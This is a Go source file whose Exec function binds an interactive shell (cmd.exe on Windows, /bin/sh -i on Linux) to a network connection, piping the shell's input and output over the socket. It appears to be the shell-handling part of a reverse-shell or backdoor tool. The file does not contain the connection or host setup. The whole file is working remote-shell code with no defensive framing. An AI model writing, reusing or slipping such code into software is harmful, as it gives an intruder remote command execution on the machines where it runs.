package tcp

import (
	"fmt"
	"io"
	"net"
	"os/exec"
)

// Exec executes cmd commands based on the OS environment
func Exec(conn net.Conn, host string) {
	env := []string{"cmd.exe", "/bin/sh", "-i"}
	if host == "windows" {
		cmd := exec.Command(env[0])
		fmt.Println("cmd := ", cmd)
		rp, wp := io.Pipe()
		// Set stdin to our connection
		cmd.Stdin = conn
		cmd.Stdout = wp
		go io.Copy(conn, rp)
		cmd.Run()
		conn.Close()
	}
	if host == "linux" {
		cmd := exec.Command(env[1], env[2])
		fmt.Println("cmd := ", cmd)
		rp, wp := io.Pipe()
		// Set stdin to our connection
		cmd.Stdin = conn
		cmd.Stdout = wp
		go io.Copy(conn, rp)
		cmd.Run()
		conn.Close()
	}
}
